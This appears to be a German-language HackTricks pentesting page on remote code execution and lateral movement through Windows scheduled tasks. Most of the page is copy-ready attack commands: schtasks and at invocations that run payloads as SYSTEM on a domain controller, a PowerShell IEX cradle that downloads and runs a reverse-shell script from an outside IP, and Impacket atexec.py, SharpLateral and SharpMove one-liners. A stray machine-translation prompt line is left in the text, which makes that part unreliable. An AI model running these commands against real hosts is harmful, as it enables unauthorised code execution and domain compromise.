# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Funktionsweise

Mit administrativem Zugriff auf einen Windows-Host kann ein Operator remote eine geplante Aufgabe erstellen und starten. Die Option `/S` wählt den Remotehost aus, `/U` und `/P` stellen bei Bedarf Anmeldedaten zum Erstellen der Aufgabe bereit, und `/RU` wählt das Konto aus, unter dem die Aufgabe ausgeführt wird. Der mit `/TR` angegebene Befehl muss auf dem Remotesystem vorhanden sein.<sup>[[1]](#references)</sup>

Der ältere Befehl `at` kann ebenfalls einen Befehl auf einem Remotehost planen, wenn der Schedule-Dienst ausgeführt wird. Er führt geplante Aufträge unter dem Dienstkonto aus, das üblicherweise `SYSTEM` ist:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Erstelle die Aufgabe und starte sie:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Please provide the English text to translate.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Verwende für eine wiederkehrende wöchentliche Aufgabe einen gültigen Wochenplan und gib den Tag ausdrücklich an:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Eine Task-Aktion kann PowerShell auch direkt aufrufen. Das folgende Laborbeispiel lädt ein Script herunter und führt es aus; hoste die Payload ausschließlich auf Infrastruktur, die für das Assessment autorisiert ist:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impackets `atexec.py` automatisiert die Remote-Befehlsausführung über den Task Scheduler service und unterstützt die Authentifizierung per Passwort, NTLM-Hash oder Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral bietet eine Ausführungsmethode für geplante Aufgaben:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove bietet eine weitere Task-Scheduler-Implementierung:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Weitere Informationen zur [**Verwendung von schtasks mit silver tickets hier**](../active-directory-methodology/silver-ticket.md#host).

Testaufgaben nach der Verwendung entfernen:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at`-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
